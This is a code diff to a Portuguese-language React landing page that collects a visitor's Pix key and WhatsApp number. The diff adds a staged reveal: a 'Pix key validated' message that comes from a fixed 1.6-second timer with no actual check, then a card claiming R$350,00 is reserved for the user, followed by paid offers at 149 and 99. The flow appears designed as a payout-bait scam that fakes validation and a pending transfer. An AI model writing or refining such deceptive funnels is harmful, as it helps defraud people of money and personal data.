@@ -30,7 +30,7 @@ export const Route = createFileRoute("/")({
   component: Index,
 });
 
-type Stage = "locked" | "form" | "reserved";
+type Stage = "locked" | "form" | "validated" | "reserved";
 
 function Index() {
   const [playing, setPlaying] = useState(false);
@@ -89,7 +89,8 @@ function Index() {
     const result = await send({ data: { pixKey: pixKey.trim(), whatsapp: whatsapp.trim() } });
     setSending(false);
     if (result.ok) {
-      setStage("reserved");
+      setStage("validated");
+      window.setTimeout(() => setStage("reserved"), 1600);
       return;
     }
     if (result.reason === "duplicate") {
@@ -191,24 +192,36 @@ function Index() {
         </section>
       ) : null}
 
-      {stage === "reserved" && !showOffer1 ? (
-        <section className="surface-card reveal-up mx-auto mt-5 rounded-2xl p-6 text-center">
-          <div className="mx-auto grid h-14 w-14 place-items-center rounded-full bg-success text-2xl text-success-foreground">
+      {stage === "validated" ? (
+        <section className="surface-card reveal-up mx-auto mt-5 rounded-2xl p-7 text-center">
+          <div className="mx-auto grid h-11 w-11 place-items-center rounded-full bg-success text-lg font-bold text-success-foreground">
             ✓
           </div>
-          <h2 className="mt-4 text-2xl font-extrabold uppercase tracking-tight text-success">
-            Transferência reservada com sucesso
-          </h2>
-          <p className="mt-3 text-sm text-muted-foreground">
-            {blocked
-              ? "Já existe um resgate registrado para você. É permitida apenas uma liberação por pessoa."
-              : "Sua chave Pix foi registrada e o seu valor está reservado. Continue assistindo ao vídeo até o final para receber as instruções da liberação."}
-          </p>
-          <p className="mt-4 text-xs uppercase tracking-widest text-muted-foreground">
-            Continue assistindo para liberar a próxima etapa
-          </p>
+          <p className="mt-4 text-[19px] font-semibold">Chave Pix validada!</p>
         </section>
       ) : null}
+
+      {stage === "reserved" && !showOffer1 ? (
+        <section className="reveal-up mx-auto mt-5 rounded-2xl bg-sheet p-6 text-center text-sheet-foreground">
+          <div className="mx-auto grid h-11 w-11 place-items-center rounded-full bg-success text-lg font-bold text-success-foreground">
+            ✓
+          </div>
+          <h2 className="mt-4 text-[21px] font-bold tracking-tight">Transferência Reservada com Sucesso.</h2>
+          <p className="mt-1 text-[14px] opacity-70">Continue assistindo para garantir!</p>
+
+          <div className="mt-5 rounded-xl bg-black/[0.04] p-4 text-left">
+            <p className="text-[15px]">R$350,00 Reservados para:</p>
+            <div className="mt-3 flex items-center gap-3 rounded-xl border border-black/10 bg-sheet px-4 py-3">
+
+              <span className="text-[14px] opacity-50">Chave Pix</span>
+              <span className="truncate text-[15px] font-semibold">
+                {blocked ? "Resgate já registrado" : pixKey}
+              </span>
+            </div>
+          </div>
+        </section>
+      ) : null}
+
 
       {showOffer1 ? <OfferBlock price={showOffer2 ? 99 : 149} {...(showOffer2 ? { previousPrice: 149 } : {})} /> : null}
 
